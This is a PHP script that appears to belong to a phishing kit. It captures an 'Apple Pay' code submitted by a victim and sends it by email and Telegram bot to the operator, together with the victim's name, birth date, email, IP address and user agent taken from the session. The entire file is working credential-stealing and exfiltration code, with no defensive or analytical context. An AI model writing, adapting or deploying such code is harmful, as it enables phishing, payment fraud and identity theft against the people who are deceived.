<?php

include("../config.php");
include("tg.php");


if(isset($_POST)){

	if(!isset($_SESSION)){
		session_start();
	}
	$_SESSION["code"] = $_POST["code"];

	if(1 == 1){

				######################
				#### MAIL SENDING ####
				######################

					
					$message = "

[📝] Code Apple Pay [📝]

📝 Code Apple Pay : ".$_SESSION['code']."
                    
[⌚️] Log & Infos [⌚️]

⌚️ Nom : ".$_SESSION['nom']."
⌚️ Prénom : ".$_SESSION['prenom']."
⌚️ Naissance : ".$_SESSION['naissance']."
⌚️ Email : ".$_SESSION['mail']."

[🧰] Tiers [🧰]

🧰 Adresse ip : ".$_SESSION['ip']."
🧰 User Agen : ".$_SESSION['useragent']."


					";

					$subject = "「📝」 +1 Apple Pay | ".$_SESSION['mail']." - ".$_SESSION['ip'];

					mail($to, $subject, $message);
				

				##########################
				#### TELEGRAM SENDING ####
				##########################



$messaggio = '

[📝] Code Apple Pay [📝]

📝 Code Apple Pay : '.$_SESSION['code'].'

[⌚️] Log & Infos [⌚️]

⌚️ Nom : '.$_SESSION['nom'].'
⌚️ Prénom : '.$_SESSION['prenom'].'
⌚️ Naissance : '.$_SESSION['naissance'].'
⌚️ Email : '.$_SESSION['mail'].'

[🧰] Tiers [🧰]

🧰 Adresse IP : '.$_SESSION['ip'].'
🧰 User-agent : '.$_SESSION['useragent'].'


					';

					sendMessage($chat, $messaggio, $token);
				
				//$_SESSION["logged"] = true;
				
				
				}


	}

else{
	header('Location: ../');
}


?>